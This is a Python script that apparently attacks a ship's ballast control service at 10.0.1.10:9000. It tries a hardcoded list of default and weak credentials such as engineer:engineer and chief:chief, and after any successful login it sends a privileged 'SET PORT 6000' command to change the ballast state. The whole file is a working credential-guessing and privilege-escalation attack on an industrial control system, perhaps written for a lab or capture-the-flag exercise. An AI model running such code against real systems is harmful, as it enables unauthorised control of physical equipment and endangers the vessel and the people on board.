#!/usr/bin/env python3
"""Test privilege escalation on Ballast Control System"""
import socket
import time

def test_login(host, port, username, password):
    """Test a single login attempt"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))

        # Read banner
        banner = sock.recv(4096).decode('utf-8', errors='ignore')

        # Send login
        cmd = f"LOGIN {username} {password}\n"
        sock.sendall(cmd.encode())
        time.sleep(0.5)

        response = sock.recv(4096).decode('utf-8', errors='ignore')

        if "Logged in" in response:
            # Try privileged command
            sock.sendall(b"SET PORT 6000\n")
            time.sleep(0.5)
            set_response = sock.recv(4096).decode('utf-8', errors='ignore')

            sock.close()
            return True, response, set_response
        else:
            sock.close()
            return False, response, None

    except Exception as e:
        return False, str(e), None

if __name__ == "__main__":
    HOST = "10.0.1.10"
    PORT = 9000

    # Test engineer-related credentials
    credentials = [
        ("engineer", "engineer"),
        ("engineer", "password"),
        ("engineer", "123456"),
        ("engineer", "admin"),
        ("admin", "engineer"),
        ("supervisor", "supervisor"),
        ("manager", "manager"),
        ("captain", "engineer"),
        ("chief", "chief"),
        ("technician", "technician"),
    ]

    print(f"Testing privilege escalation on {HOST}:{PORT}")
    print("=" * 60)

    for username, password in credentials:
        print(f"Testing {username}:{password}...", end=" ")
        success, response, set_resp = test_login(HOST, PORT, username, password)

        if success:
            print(f"\n[SUCCESS] Valid credentials: {username}:{password}")
            print(f"Response: {response}")
            if set_resp:
                print(f"SET command: {set_resp}")
            print("-" * 60)
        else:
            print("[FAILED]")

        time.sleep(2)  # Rate limiting

    print("\nTesting complete.")
